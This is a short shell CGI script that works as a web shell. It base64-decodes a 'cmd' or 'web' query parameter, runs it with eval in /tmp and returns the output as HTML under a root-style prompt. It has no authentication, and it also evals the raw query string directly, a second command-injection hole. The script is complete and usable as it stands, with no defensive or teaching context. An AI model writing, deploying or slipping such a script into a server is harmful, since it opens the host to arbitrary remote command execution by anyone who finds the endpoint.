#!/bin/sh
echo "HTTP/1.1 200 OK
Date: $(TZ=GMT0 date +'%a, %d %b %Y %T %Z')
Server: $SERVER_SOFTWARE
Content-type: text/html; charset=UTF-8
Cache-Control: no-store
Pragma: no-cache
"

[ -n "$QUERY_STRING" ] && eval $(echo "$QUERY_STRING" | sed "s/&/;/g")
[ -n "$cmd" ] && c=$(echo $cmd | base64 -d)
[ -n "$web" ] && c=$(echo $web | base64 -d) && t="timeout 3"
[ -z "$c" ] && echo "No command!" && exit 1

prompt() {
	echo "<b>$(whoami)@$(hostname):$PWD# ${1}</b>"
}

export PATH=/usr/local/bin:/usr/local/sbin:/bin:/sbin:/usr/bin:/usr/sbin
cd /tmp || return

prompt "$c"
eval "$t $c" 2>&1
prompt

exit 0
